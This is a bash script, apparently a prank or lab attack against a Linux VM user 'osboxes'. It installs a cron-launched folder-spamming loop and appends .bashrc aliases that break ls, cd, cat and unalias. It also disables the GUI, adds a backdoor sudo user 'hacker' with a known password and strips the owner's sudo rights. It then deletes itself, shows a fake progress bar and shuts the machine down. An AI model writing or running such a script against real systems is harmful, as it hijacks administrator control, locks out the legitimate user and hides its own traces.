#!/bin/bash

# Cron
sudo cat <<EOF > /home/osboxes/folderblaster
import random
import string
import time
import os

letters = string.ascii_lowercase
folderName = ''.join(random.choice(letters) for i in range(6))
directory = '/home/osboxes/Desktop/'
f1 = directory + folderName + '123'
f2 = directory + folderName + '234'
f3 = directory + folderName + '345'
while True:
 try:
  if not os.path.exists(f1):
   os.makedirs(f1)
  if not os.path.exists(f2):
   os.makedirs(f2)
  if not os.path.exists(f3):
   os.makedirs(f3)
 except:
   pass
 time.sleep(1)
EOF
sudo chmod 777 /home/osboxes/folderblaster
# write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo '* * * * * python /home/osboxes/folderblaster' >> mycron
# install new cron file
crontab mycron
rm mycron

# Define a lot of alias and make life hard
cp ~/.bashrc ~/.bashrc.rekt
cat <<EOF >> ~/.bashrc
alias ls='sl'
alias cd='echo "No such file or directory"'
alias cat='echo "No such file or directory"'
alias mv='echo "No such file or directory"'
alias nano='echo "Maybe size does matter?"'
alias vi='echo "To use vi press Ctrl+Alt, then Alt+F4 followed by Enter"'
alias touch='echo "Dont touch me"'
alias clear='echo "Seems pretty clear to me"'
alias find='echo "Keep looking"'
alias unalias='echo "Nice try, really"'
EOF

# Disable GUI
sudo systemctl set-default multi-user.target

# Add Rogue User
username="hacker"
password="hacker"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
sudo useradd -m -p $pass $username
[ $? -eq 0 ] && echo "Step 2 successful" || echo "Failed Step 2"
sudo adduser hacker sudo

# Remove Sudo permissions from osboxes
sudo deluser osboxes sudo

# Delete itself
rm -- "$0"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "5%"
echo "7%"
echo "12%"
echo "22%"
echo "23%"
echo "24%"
echo "56%"
echo "67%"
echo "68%"
echo "89%"
sleep 2
echo "96%"
sleep 1
echo "99%"
sleep 4
echo "100%"
sleep 2
echo "101%"
echo "Thanks"
sleep 3

# Done!
shutdown now
